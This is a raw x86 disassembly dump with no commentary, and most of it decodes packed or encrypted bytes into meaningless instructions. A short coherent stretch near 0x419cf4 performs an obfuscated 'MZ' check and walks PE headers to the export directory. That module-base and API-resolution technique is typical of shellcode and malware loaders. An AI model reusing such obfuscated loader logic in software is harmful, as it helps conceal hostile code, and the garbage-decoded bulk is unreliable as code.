  4195b9:	adc    BYTE PTR [esp+edx*2],bh
  4195bc:	push   esi
  4195bd:	into   
  4195be:	jecxz  0x4195c6
  4195c0:	or     DWORD PTR [eax-0x3cb55991],esp
  4195c6:	add    ebp,ebx
  4195c8:	jno    0x419647
  4195ca:	push   es
  4195cb:	dec    ebp
  4195cc:	cmp    al,0xb5
  4195ce:	push   ds
  4195cf:	xchg   ebp,eax
  4195d0:	push   es
  4195d1:	lock scas al,BYTE PTR es:[edi]
  4195d3:	loop   0x419607
  4195d5:	aam    0x70
  4195d7:	adc    BYTE PTR [esi],bl
  4195d9:	gs retf 0xdca5
  4195dd:	cmp    BYTE PTR [edi-0x44],dh
  4195e0:	cmc    
  4195e1:	xchg   DWORD PTR [edx-0x5006f8c2],edi
  4195e7:	pop    esi
  4195e8:	imul   edx,ecx,0x72
  4195eb:	cs sub al,0x9e
  4195ee:	test   eax,0xe84d17f
  4195f3:	sub    al,0xb1
  4195f5:	test   eax,0x419a0772
  4195fa:	adc    al,0xc0
  4195fc:	jg     0x41962e
  4195fe:	lods   al,BYTE PTR ds:[esi]
  4195ff:	stos   DWORD PTR es:[edi],eax
  419600:	add    dh,0x1
  419603:	adc    al,BYTE PTR [ecx+0x4e]
  419606:	rcr    ah,1
  419608:	xchg   BYTE PTR [edi+edx*8-0x52],al
  41960c:	adc    ecx,edx
  41960e:	pop    es
  41960f:	dec    esp
  419610:	dec    eax
  419611:	cld    
  419612:	sub    DWORD PTR [edi-0x5fddfe85],edx
  419618:	inc    eax
  419619:	retf   0x2853
  41961c:	sbb    esp,ebp
  41961e:	inc    ebx
  41961f:	idiv   edi
  419621:	cs jmp 0x2b52:0xf96f13b6
  419629:	adc    dl,BYTE PTR [eax]
  41962b:	mov    ebp,0x7185c33e
  419630:	push   ebx
  419631:	arpl   cx,ax
  419633:	je     0x4195e5
  419635:	pusha  
  419636:	push   edx
  419637:	adc    BYTE PTR [eax],bl
  419639:	int3   
  41963a:	mov    ebp,0x87a561d
  41963f:	addr16 jbe 0x41960c
  419642:	inc    edx
  419643:	pop    ebx
  419644:	cmp    eax,0xf8102036
  419649:	adc    al,0x24
  41964b:	dec    ecx
  41964c:	out    dx,al
  41964d:	sahf   
  41964e:	add    eax,0x2ce542aa
  419653:	add    esp,DWORD PTR ds:0xf0557580
  419659:	or     esp,0x8c251b5e
  41965f:	aas    
  419660:	inc    ecx
  419661:	sahf   
  419662:	add    eax,0x2fb8e405
  419667:	ins    BYTE PTR es:[edi],dx
  419668:	arpl   WORD PTR [esi],ax
  41966a:	ins    DWORD PTR es:[edi],dx
  41966b:	rcl    BYTE PTR [edi-0x5c],cl
  41966e:	jae    0x4196d3
  419670:	fbld   TBYTE PTR [edx+0x648b1cdb]
  419676:	push   ebp
  419677:	pushf  
  419678:	mov    edi,0xa4ed6070
  41967d:	das    
  41967e:	inc    ebx
  41967f:	(bad)
  419682:	push   es
  419683:	cmc    
  419684:	xchg   ebx,eax
  419685:	enter  0x27ca,0xed
  419689:	mov    edi,DWORD PTR [ecx-0x31b542a4]
  41968f:	addr16 dec edx
  419691:	cli    
  419692:	test   BYTE PTR [esi-0x69],bl
  419695:	test   DWORD PTR [eax+0x5d],edx
  419698:	jge    0x4196d9
  41969a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41969b:	fnsave [edi-0x6111296f]
  4196a1:	fisub  DWORD PTR [esi+0x91e253]
  4196a7:	sub    eax,0x414b251d
  4196ac:	mov    cl,0xaf
  4196ae:	jne    0x4196b3
  4196b0:	mov    al,dh
  4196b2:	fcom   QWORD PTR ds:[ebp-0x2e]
  4196b6:	imul   ecx,DWORD PTR [eax+0x4a77f70],0x9bf4b089
  4196c0:	aam    0xb2
  4196c2:	sub    eax,0x3d0388a4
  4196c7:	jae    0x419736
  4196c9:	ret    0xb264
  4196cc:	jmp    0x45eb7179
  4196d1:	mov    ebx,0x6a5c43c4
  4196d6:	push   esp
  4196d7:	xchg   edx,eax
  4196d8:	aaa    
  4196d9:	outs   dx,DWORD PTR ds:[esi]
  4196da:	xchg   edi,eax
  4196db:	inc    ecx
  4196dc:	mov    ah,0x9c
  4196de:	stos   BYTE PTR es:[edi],al
  4196df:	es in  al,0xfb
  4196e2:	mov    cl,0xf1
  4196e4:	mov    ds:0xf47021d4,al
  4196e9:	test   BYTE PTR [ebp-0x44e5252],al
  4196ef:	lock jmp 0x2fa0fdc7
  4196f5:	dec    ebp
  4196f6:	mov    dl,0xb6
  4196f8:	jge    0x41969b
  4196fa:	aaa    
  4196fb:	sub    eax,0x96b58e07
  419700:	xchg   edi,eax
  419701:	(bad)  
  419702:	scas   al,BYTE PTR es:[edi]
  419703:	adc    edi,DWORD PTR [ecx+ecx*4+0x72]
  419707:	mov    ds:0xbf1a225b,al
  41970c:	jmp    0x7f4c12ee
  419711:	jno    0x4196f4
  419713:	xchg   DWORD PTR [esp+esi*4],esi
  419716:	sti    
  419717:	add    cl,dh
  419719:	jns    0x419749
  41971b:	arpl   WORD PTR [ecx+0x27],sp
  41971e:	popf   
  41971f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419720:	ficomp DWORD PTR [ecx-0x72cac2b6]
  419726:	fcomp  QWORD PTR [edi+0x14de87c3]
  41972c:	icebp  
  41972d:	ja     0x4196d6
  41972f:	not    BYTE PTR [edx]
  419731:	xor    DWORD PTR [edx-0x5c6a00b5],ebp
  419737:	int3   
  419738:	enter  0x2bc9,0xf2
  41973c:	sub    bh,BYTE PTR ds:0xe9d72e0b
  419742:	xchg   ebx,eax
  419743:	lock xor al,0xb5
  419746:	je     0x4196e7
  419748:	jnp    0x419783
  41974a:	sahf   
  41974b:	rol    BYTE PTR [edx+0x508a8363],cl
  419751:	std    
  419752:	shl    BYTE PTR [edi+ebx*8+0x13],1
  419756:	push   edx
  419757:	daa    
  419758:	cld    
  419759:	mov    al,BYTE PTR [edx-0x2f]
  41975c:	inc    esi
  41975d:	push   edi
  41975e:	fmul   QWORD PTR [ebp+0x21426b27]
  419764:	jno    0x419769
  419766:	xor    ecx,ecx
  419768:	jmp    0x84e0b1c
  41976d:	xor    edx,edx
  41976f:	(bad)  
  419770:	pop    esp
  419771:	(bad)  
  419773:	sub    esp,DWORD PTR [ebp-0x11]
  419776:	inc    edx
  419777:	sar    BYTE PTR [edi-0x20],0x42
  41977b:	xchg   esi,edx
  41977d:	push   ds
  41977e:	mov    edx,0x3bc8025a
  419783:	mov    bh,BYTE PTR [edi+eiz*8-0x1c06a001]
  41978a:	xchg   ebx,eax
  41978b:	fs push cs
  41978d:	mov    eax,es:0x92896b9e
  419793:	cli    
  419794:	xor    cl,dl
  419796:	(bad)  
  419797:	outs   dx,BYTE PTR ds:[esi]
  419798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419799:	sub    DWORD PTR [edx+eiz*8-0x6b],edx
  41979d:	cmp    eax,0xcf6c7f80
  4197a2:	ficomp DWORD PTR [edx+0xc2482ab]
  4197a8:	adc    DWORD PTR [edx],edi
  4197aa:	(bad)  
  4197ab:	outs   dx,DWORD PTR ds:[esi]
  4197ac:	mov    al,ds:0x9f41eb61
  4197b1:	call   0x56732df0
  4197b6:	xor    DWORD PTR [eax-0xdb9ca23],0x2c7c36b1
  4197c0:	and    al,0x39
  4197c2:	test   dh,dh
  4197c4:	mov    ch,BYTE PTR [edx+ebx*2-0x2c4dd2da]
  4197cb:	test   al,0xb1
  4197cd:	arpl   WORD PTR [edx+0x46],sp
  4197d0:	je     0x41981c
  4197d2:	fs in  al,0xf
  4197d5:	dec    ecx
  4197d6:	test   BYTE PTR [ebx+0x6b],0x51
  4197da:	hlt    
  4197db:	sbb    eax,esp
  4197dd:	inc    ebp
  4197de:	mov    ah,0x8d
  4197e0:	or     BYTE PTR [eax+ecx*1],dh
  4197e3:	or     eax,0xe8e9bae5
  4197e8:	xchg   ebx,esi
  4197ea:	add    DWORD PTR [esi*2+0x1b14c5f9],edx
  4197f1:	xor    al,0x35
  4197f3:	aad    0xff
  4197f5:	or     BYTE PTR [esi+0x75fe580b],0xfc
  4197fc:	test   al,0xd6
  4197fe:	mov    BYTE PTR [ecx+0x5c66c9b7],bl
  419804:	mov    al,0x4d
  419806:	xchg   esi,eax
  419807:	call   esi
  419809:	cs jnp 0x4197e9
  41980c:	das    
  41980d:	int    0xcb
  41980f:	mov    bl,0xb5
  419811:	retf   0xb83b
  419814:	mov    al,ds:0xdbcd4717
  419819:	cmc    
  41981a:	out    0x87,eax
  41981c:	in     eax,0xec
  41981e:	sub    al,0xaa
  419820:	adc    BYTE PTR [edx+ecx*4],0x7d
  419824:	adc    eax,0x782603d5
  419829:	sub    bh,BYTE PTR [edx+edx*1+0x66]
  41982d:	mov    ecx,0x4b0add22
  419832:	adc    al,BYTE PTR [edx]
  419834:	cmp    ah,BYTE PTR [ebx]
  419836:	rcl    BYTE PTR [esi+0x27782bc2],0x81
  41983d:	popa   
  41983e:	pop    ebp
  41983f:	mov    ds:0x608dadbd,al
  419844:	sbb    ch,BYTE PTR [edi]
  419846:	icebp  
  419847:	pop    ecx
  419848:	push   ds
  419849:	mov    dl,0x4b
  41984b:	and    dl,BYTE PTR [eax+edi*8]
  41984e:	cld    
  41984f:	repnz or DWORD PTR [edi-0x25],edx
  419853:	je     0x419856
  419855:	(bad)  
  419856:	das    
  419857:	in     eax,0xab
  419859:	call   0xe3ae:0x78ada3d5
  419860:	fstp   DWORD PTR [ebx-0x2e]
  419863:	and    eax,DWORD PTR [ebx]
  419865:	sbb    eax,0xa7c18ae3
  41986a:	loope  0x419899
  41986c:	bound  eax,QWORD PTR [ebx+0x54a404d7]
  419872:	rol    ebp,cl
  419874:	add    bl,BYTE PTR [ebx+0x45]
  419877:	in     al,dx
  419878:	push   esi
  419879:	arpl   WORD PTR [eax],sp
  41987b:	xchg   esi,eax
  41987c:	adc    BYTE PTR gs:[eax+0x11670237],0x3e
  419884:	inc    ecx
  419885:	je     0x4198e5
  419887:	inc    ebx
  419888:	icebp  
  419889:	jno    0x41985f
  41988b:	out    0xfa,al
  41988d:	(bad)  
  41988e:	das    
  41988f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419890:	inc    ebx
  419891:	stos   BYTE PTR es:[edi],al
  419892:	push   es
  419893:	loop   0x4198f2
  419895:	jp     0x419862
  419897:	mov    edx,0xf0648ab9
  41989c:	pop    ecx
  41989d:	and    al,0xa6
  41989f:	xchg   edi,eax
  4198a0:	jne    0x419850
  4198a2:	iret   
  4198a3:	imul   eax,DWORD PTR [ecx+0x7aaa4e60],0xfffffff6
  4198aa:	(bad)  
  4198ab:	push   esp
  4198ac:	fdiv   DWORD PTR [eax+0x8]
  4198af:	and    BYTE PTR [ecx+0x18],0x7b
  4198b3:	or     BYTE PTR [edi+0x2aaacf32],0x2f
  4198ba:	test   dl,bl
  4198bc:	out    dx,eax
  4198bd:	xchg   edx,eax
  4198be:	push   es
  4198bf:	and    BYTE PTR [edx+0x56],dh
  4198c2:	mov    cl,0x89
  4198c4:	inc    esi
  4198c5:	ins    BYTE PTR es:[edi],dx
  4198c6:	cmp    dh,bl
  4198c8:	or     ebp,0xfffffff0
  4198cb:	jl     0x419945
  4198cd:	cmp    dh,BYTE PTR [eax]
  4198cf:	leave  
  4198d0:	pushf  
  4198d1:	sub    al,0xbf
  4198d3:	pop    ss
  4198d4:	dec    edi
  4198d5:	mov    eax,ds:0x961a8bc1
  4198da:	jge    0x419932
  4198dc:	test   cl,dl
  4198de:	jne    0x4198d2
  4198e0:	loope  0x41991d
  4198e2:	push   esp
  4198e3:	dec    ebx
  4198e4:	jae    0x4198c6
  4198e6:	and    DWORD PTR [edi+0x6],edi
  4198e9:	mov    dl,0x78
  4198eb:	pop    ebp
  4198ec:	sbb    DWORD PTR [edx+0x3c2cb5cf],ebp
  4198f2:	adc    ebp,DWORD PTR [edx+0x74b8d3a3]
  4198f8:	inc    eax
  4198f9:	addr16 nop
  4198fb:	mov    edi,DWORD PTR [edi+edi*2]
  4198fe:	or     eax,0x16d7c7f6
  419903:	sar    edi,0x88
  419906:	mov    bl,0xc4
  419908:	(bad)  
  419909:	icebp  
  41990a:	je     0x4198a7
  41990c:	mov    ebx,0x82d0f545
  419911:	push   esp
  419912:	mov    es,WORD PTR ds:0xfd53e590
  419918:	mov    edx,0xcc112655
  41991d:	ret    0xa9c3
  419920:	dec    esp
  419921:	retf   0x433
  419924:	sub    eax,0x71853d6e
  419929:	push   ds
  41992a:	push   esp
  41992b:	xchg   edx,eax
  41992c:	pushf  
  41992d:	(bad)  
  41992f:	out    dx,eax
  419930:	ror    DWORD PTR [ebx+0x3a],1
  419933:	jb     0x4198bc
  419935:	popa   
  419936:	in     eax,dx
  419937:	(bad)  
  419939:	out    dx,eax
  41993a:	(bad)
  41993d:	pop    cx
  41993f:	in     al,0x5c
  419941:	sar    BYTE PTR [edi],cl
  419943:	faddp  st(0),st
  419945:	jmp    0xf63fb501
  41994a:	pop    ds
  41994b:	aam    0xd7
  41994d:	cmp    ch,al
  41994f:	push   ebx
  419950:	iret   
  419951:	mov    ds:0x55bad239,al
  419956:	xor    eax,0xb8d6afed
  41995b:	and    eax,0x12115e9b
  419960:	or     BYTE PTR [eax-0x4207adc0],bl
  419966:	fidiv  DWORD PTR [esi+edi*1+0x33fae353]
  41996d:	(bad)
  419970:	cs (bad) 
  419972:	mov    al,0xe3
  419974:	out    dx,al
  419975:	pop    ebp
  419976:	scas   eax,DWORD PTR es:[edi]
  419977:	push   DWORD PTR [ebp-0x5059e2d0]
  41997d:	xchg   ebx,ecx
  41997f:	out    0xb2,al
  419981:	ss into 
  419983:	sahf   
  419984:	out    dx,eax
  419985:	jbe    0x41997c
  419987:	lods   al,BYTE PTR ds:[esi]
  419988:	jmp    0x195:0xecf0f52b
  41998f:	push   edx
  419990:	push   edx
  419991:	xor    bh,BYTE PTR [ebx]
  419993:	inc    esi
  419994:	fnstenv [ebx-0x3a]
  419997:	and    dh,BYTE PTR ds:0x7cbe95f7
  41999d:	mov    ecx,0xc962bc37
  4199a2:	jbe    0x4199e9
  4199a4:	test   eax,0x9312c122
  4199a9:	std    
  4199aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ab:	add    esp,DWORD PTR [ebp+0x44ee2faf]
  4199b1:	fsub   QWORD PTR [esi-0x5e9bb038]
  4199b7:	jle    0xde967bcb
  4199bd:	add    esp,ebx
  4199bf:	push   cs
  4199c0:	cmp    eax,0x37a6b64a
  4199c5:	inc    edi
  4199c6:	jecxz  0x419a31
  4199c8:	push   ds
  4199c9:	add    DWORD PTR [ecx+ebp*2],0x2c
  4199cd:	xor    bh,BYTE PTR [ebp+0x13]
  4199d0:	out    0x18,al
  4199d2:	fwait
  4199d3:	jo     0x419971
  4199d5:	fiadd  DWORD PTR [eax]
  4199d7:	pop    edi
  4199d8:	push   esi
  4199d9:	dec    eax
  4199da:	sar    DWORD PTR [edx+0x761c91ab],0xcd
  4199e1:	pop    ecx
  4199e2:	xor    DWORD PTR [esi],eax
  4199e4:	xchg   DWORD PTR ds:0x9233109d,ebp
  4199ea:	ins    DWORD PTR es:[edi],dx
  4199eb:	js     0x419a14
  4199ed:	inc    edx
  4199ee:	and    eax,0x7d11c708
  4199f3:	xchg   ebp,eax
  4199f4:	jne    0x4199d4
  4199f6:	cmp    eax,0xf7f45e36
  4199fb:	inc    esp
  4199fc:	push   edi
  4199fd:	add    dh,BYTE PTR [ebp+0x21]
  419a00:	and    eax,0x273e01fa
  419a05:	mov    ds:0x507e804,al
  419a0a:	xchg   ebx,eax
  419a0b:	xor    cl,dl
  419a0d:	cdq    
  419a0e:	stos   DWORD PTR es:[edi],eax
  419a0f:	aaa    
  419a10:	mov    ch,0x88
  419a12:	jne    0x419a3a
  419a14:	mov    edi,0xc0eb1f9
  419a19:	fsub   QWORD PTR [edi]
  419a1b:	mov    cl,0x88
  419a1d:	les    edx,FWORD PTR [ecx+0x664f0938]
  419a23:	pop    ss
  419a24:	xor    eax,0x59c13066
  419a29:	mov    edx,0x118a3752
  419a2e:	add    esp,DWORD PTR [ebx-0x2a6f496e]
  419a34:	xchg   edi,eax
  419a35:	dec    edi
  419a36:	push   ecx
  419a37:	mov    al,ds:0xcd58eee
  419a3c:	es ja  0x419aba
  419a3f:	js     0x419a6f
  419a41:	ret    0x3036
  419a44:	int3   
  419a45:	push   esi
  419a46:	(bad)  
  419a47:	repz cmp ah,BYTE PTR [esi+0x762ef5f4]
  419a4e:	pop    esp
  419a4f:	push   eax
  419a50:	dec    ecx
  419a51:	jne    0x419abc
  419a53:	jmp    0xcc90e777
  419a58:	sub    BYTE PTR [esi+0xf],ah
  419a5b:	loop   0x419a54
  419a5d:	xor    BYTE PTR [ecx-0x7ca13cd],ah
  419a63:	pushf  
  419a64:	icebp  
  419a65:	sub    DWORD PTR [ebp+0x786d09ed],0x11b2de99
  419a6f:	mov    eax,ds:0xde87b854
  419a74:	cmp    DWORD PTR [edx],esi
  419a76:	hlt    
  419a77:	shr    BYTE PTR [ebx],1
  419a79:	pop    esi
  419a7a:	mov    gs,WORD PTR [esi-0x140aef6]
  419a80:	sub    eax,0xe48a91f5
  419a85:	stos   DWORD PTR es:[edi],eax
  419a86:	xor    al,0x76
  419a88:	pop    ss
  419a89:	leave  
  419a8a:	mov    esi,0x16493c81
  419a8f:	mov    cl,0x16
  419a91:	cld    
  419a92:	out    0x69,al
  419a94:	loope  0x419ae0
  419a96:	mov    bl,0x5d
  419a98:	or     DWORD PTR [eax],esi
  419a9a:	cmp    ah,BYTE PTR [edi]
  419a9c:	dec    eax
  419a9d:	mov    ebp,0xe5b672a6
  419aa2:	arpl   si,bx
  419aa4:	and    DWORD PTR [edx],esp
  419aa6:	mov    esp,0x79e5a66b
  419aab:	hlt    
  419aac:	clc    
  419aad:	adc    eax,0xb34f2c1
  419ab2:	mov    esi,0x4fa9343c
  419ab7:	in     eax,0x7d
  419ab9:	xchg   edi,eax
  419aba:	mov    bl,0x7c
  419abc:	add    eax,DWORD PTR [ecx+0x22]
  419abf:	xchg   ebp,eax
  419ac0:	mov    ah,0xcb
  419ac2:	sub    eax,0xc6cec590
  419ac7:	daa    
  419ac8:	push   0x5594907b
  419acd:	sub    DWORD PTR [ebx-0x4b952272],eax
  419ad3:	das    
  419ad4:	retf   
  419ad5:	ins    BYTE PTR es:[edi],dx
  419ad6:	cs ds aas 
  419ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ada:	lods   al,BYTE PTR ds:[esi]
  419adb:	jbe    0x419aac
  419add:	mov    ds:0x1d89a134,eax
  419ae2:	addr16 inc ecx
  419ae4:	jno    0x419a9f
  419ae6:	mov    WORD PTR [esi+0x7d],?
  419ae9:	retf   
  419aea:	xchg   ebp,eax
  419aeb:	push   es
  419aec:	ins    BYTE PTR es:[edi],dx
  419aed:	cld    
  419aee:	jo     0x419aa9
  419af0:	lds    ebx,FWORD PTR [ebp+ecx*8+0x2b]
  419af4:	(bad)  
  419af5:	in     eax,dx
  419af6:	stos   BYTE PTR es:[edi],al
  419af7:	or     bl,BYTE PTR [esi+0x34]
  419afa:	das    
  419afb:	iret   
  419afc:	mov    ah,0x24
  419afe:	xor    eax,DWORD PTR [edi]
  419b00:	fcomp  st(0)
  419b02:	in     eax,0x44
  419b04:	scas   al,BYTE PTR es:[edi]
  419b05:	pop    ebp
  419b06:	in     eax,dx
  419b07:	add    edx,DWORD PTR [ebx]
  419b09:	pop    ecx
  419b0a:	jb     0x419b40
  419b0c:	loopne 0x419b13
  419b0e:	pop    ecx
  419b0f:	mov    ds,WORD PTR [ebx]
  419b11:	push   esp
  419b12:	cmp    al,0x26
  419b14:	test   al,0x2c
  419b16:	push   ebp
  419b17:	mov    ecx,0xb932cbfe
  419b1c:	(bad)  
  419b1d:	lods   al,BYTE PTR ds:[esi]
  419b1e:	dec    esp
  419b1f:	mov    al,0x17
  419b21:	fisttp QWORD PTR [eax]
  419b24:	fadd   QWORD PTR [ecx-0x2fa88981]
  419b2a:	adc    esp,edi
  419b2c:	jge    0x419ad6
  419b2e:	lods   eax,DWORD PTR ds:[esi]
  419b2f:	jne    0x419b63
  419b31:	xchg   esi,eax
  419b32:	sbb    eax,ebx
  419b34:	pop    esp
  419b35:	ins    BYTE PTR es:[edi],dx
  419b36:	mov    ebx,DWORD PTR [edi]
  419b38:	mov    ss,WORD PTR [ebx-0xd0a3bdd]
  419b3e:	(bad)  
  419b3f:	push   eax
  419b40:	add    dh,BYTE PTR [esi-0x33]
  419b43:	mov    edx,0xbb8ec27c
  419b48:	adc    BYTE PTR [eax+0x64],0x91
  419b4c:	dec    ebx
  419b4d:	mov    dh,BYTE PTR [ebp+0x59]
  419b50:	xor    DWORD PTR ds:0x29083a5c,ebp
  419b56:	loope  0x419b95
  419b58:	xchg   esi,eax
  419b59:	das    
  419b5a:	pop    eax
  419b5b:	popa   
  419b5c:	bound  ebp,QWORD PTR [edx+ecx*1-0x1b]
  419b60:	mov    DWORD PTR [eax-0x758a4081],ecx
  419b66:	push   ebp
  419b67:	fwait
  419b68:	cs je  0x419b0a
  419b6b:	call   0x5345:0x1caee541
  419b72:	pop    esp
  419b73:	mov    dh,0x53
  419b75:	bound  edi,QWORD PTR [ebx+edx*4-0x9980133]
  419b7c:	jb     0x419b37
  419b7e:	lds    eax,FWORD PTR [ebp-0x1a855996]
  419b84:	into   
  419b85:	test   eax,0xe09e0f55
  419b8a:	aam    0xaf
  419b8c:	fwait
  419b8d:	mov    bl,0x10
  419b8f:	adc    eax,0x49ef5b65
  419b94:	xor    dl,ch
  419b96:	mov    edx,DWORD PTR [eax]
  419b98:	add    DWORD PTR [esp+eiz*4],edi
  419b9b:	add    al,0x48
  419b9d:	cmp    ebp,esi
  419b9f:	and    BYTE PTR [esi+0x1b833c5],bl
  419ba5:	in     al,0x9
  419ba7:	xchg   BYTE PTR [edx+0x2a],al
  419baa:	ins    BYTE PTR es:[edi],dx
  419bab:	cmp    al,0x14
  419bad:	add    dh,BYTE PTR [ebx]
  419baf:	pop    edi
  419bb0:	pop    edi
  419bb1:	mov    ecx,0xcb7f3c32
  419bb6:	les    ebx,FWORD PTR [ebx-0x52]
  419bb9:	aam    0xc2
  419bbb:	ss into 
  419bbd:	inc    esi
  419bbe:	in     al,dx
  419bbf:	mov    ebp,0x40f74919
  419bc4:	loope  0x419b7f
  419bc6:	les    edx,FWORD PTR [ebp-0x7be1b041]
  419bcc:	call   0x3b4b67d4
  419bd1:	loope  0x419c2a
  419bd3:	xor    BYTE PTR [edi+0x46],cl
  419bd6:	jbe    0x419bb2
  419bd8:	stos   BYTE PTR es:[edi],al
  419bd9:	in     eax,dx
  419bda:	int3   
  419bdb:	int3   
  419bdc:	aad    0xf4
  419bde:	cdq    
  419bdf:	xor    edi,DWORD PTR [edx-0x36]
  419be2:	xor    ebx,eax
  419be4:	jo     0x419b6d
  419be6:	shr    BYTE PTR [edi+0x6f],cl
  419be9:	fld    QWORD PTR [esi]
  419beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bec:	jb     0x419c03
  419bee:	mov    esi,0xde1287a3
  419bf3:	inc    edi
  419bf4:	mov    esi,0xf9535f5d
  419bf9:	add    eax,esp
  419bfb:	std    
  419bfc:	push   ecx
  419bfd:	push   cs
  419bfe:	pop    ds
  419bff:	mov    edi,ebx
  419c01:	adc    dh,BYTE PTR [eax+0x38]
  419c04:	retf   
  419c05:	or     al,0x5d
  419c07:	jmp    0x1381:0xb270c687
  419c0e:	imul   esi,DWORD PTR [ecx],0xffffffd3
  419c11:	fwait
  419c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c13:	jbe    0x419c0e
  419c15:	fidivr DWORD PTR [edi+0x4e]
  419c18:	xchg   ebx,eax
  419c19:	jl     0x419bb9
  419c1b:	adc    eax,0xf5df65ae
  419c20:	and    al,bh
  419c22:	in     eax,dx
  419c23:	and    al,0x41
  419c25:	out    dx,eax
  419c26:	dec    esp
  419c27:	dec    eax
  419c28:	mov    cs,WORD PTR [edx]
  419c2a:	jo     0x419bc7
  419c2c:	leave  
  419c2d:	jae    0x419c59
  419c2f:	popf   
  419c30:	in     al,0x25
  419c32:	push   cs
  419c33:	or     eax,DWORD PTR [ebx+eax*4+0x44]
  419c37:	jae    0x419c97
  419c39:	pop    ebx
  419c3a:	adc    al,BYTE PTR ds:0x6b344a00
  419c40:	xchg   edx,eax
  419c41:	ret    0xd0f
  419c44:	test   BYTE PTR [edx+0x69c9cf64],dl
  419c4a:	imul   esp,ebp,0xd5bcefa7
  419c50:	xchg   edi,eax
  419c51:	xor    DWORD PTR [edi],esi
  419c53:	hlt    
  419c54:	cdq    
  419c55:	pop    ebx
  419c56:	fsub   DWORD PTR [ebx+0x6]
  419c59:	cld    
  419c5a:	or     DWORD PTR [eax],ecx
  419c5c:	loope  0x419c1b
  419c5e:	cmp    cl,BYTE PTR [edx+0x15d7a343]
  419c64:	and    ecx,ebx
  419c66:	(bad)  
  419c67:	jmp    0x2352:0x5f597a74
  419c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c6f:	jns    0x419c6a
  419c71:	or     ch,BYTE PTR [ecx]
  419c73:	xlat   BYTE PTR ds:[ebx]
  419c74:	jge    0x419cad
  419c76:	push   es
  419c77:	rol    esi,0x84
  419c7a:	test   al,0x4
  419c7c:	mov    esp,0x80f37c7d
  419c81:	fchs   
  419c83:	jno    0x419c1f
  419c85:	or     al,0x3a
  419c87:	jbe    0x419ccc
  419c89:	mov    bh,0xc2
  419c8b:	outs   dx,BYTE PTR ds:[esi]
  419c8c:	xlat   BYTE PTR ds:[ebx]
  419c8d:	std    
  419c8e:	push   0xffffff8c
  419c90:	mov    ch,0x93
  419c92:	out    0x71,eax
  419c94:	dec    ebp
  419c95:	ficomp DWORD PTR [ecx+ebx*2+0xa87efee]
  419c9c:	aad    0xd3
  419c9e:	cli    
  419c9f:	fstp   DWORD PTR [edx+0x1862f443]
  419ca5:	adc    edx,DWORD PTR [ebp+esi*4-0x7ece55ce]
  419cac:	sub    BYTE PTR [esi],al
  419cae:	xchg   ebp,eax
  419caf:	jmp    0xf964:0xa1cd
  419cb5:	aas    
  419cb6:	aas    
  419cb7:	das    
  419cb8:	sbb    al,0xd2
  419cba:	loop   0x419ceb
  419cbc:	in     eax,0x9b
  419cbe:	enter  0x6e38,0x73
  419cc2:	cmp    dl,0xdd
  419cc5:	rol    BYTE PTR [esi+0xdd917bf],0x36
  419ccc:	pop    ss
  419ccd:	xchg   esi,eax
  419ccf:	test   al,0x9a
  419cd1:	and    ebx,DWORD PTR [ebx]
  419cd3:	or     eax,0x4110724c
  419cd8:	inc    ecx
  419cd9:	jl     0x419cf3
  419cdb:	enter  0x90af,0xaa
  419cdf:	mov    BYTE PTR [ecx],ch
  419ce1:	(bad)  
  419ce2:	iret   
  419ce3:	xor    eax,0x7ba9269f
  419ce8:	mov    ds,ebx
  419cea:	in     eax,dx
  419ceb:	mov    bh,0x8b
  419ced:	pop    ebp
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	mov    edx,DWORD PTR [edx]
  419d85:	mov    eax,ds:0x7addf5ff
  419d8a:	jnp    0x419d74
  419d8c:	pushf  
  419d8d:	jnp    0x419e0a
  419d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d90:	fimul  DWORD PTR [edx+0x1d]
  419d93:	push   DWORD PTR [edx-0x62]
  419d96:	nop
  419d97:	mov    ebx,0x3d96c446
  419d9c:	ret    
  419d9d:	and    eax,0xa7ac92b1
  419da2:	mov    BYTE PTR [edi+0x46],bl
  419da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419da6:	(bad)  
  419da7:	xlat   BYTE PTR ds:[ebx]
  419da8:	jmp    0x419de7
  419daa:	out    0x5d,al
  419dac:	mov    esi,0x7545e573
  419db1:	dec    edx
  419db2:	daa    
  419db3:	mov    ecx,0x22254806
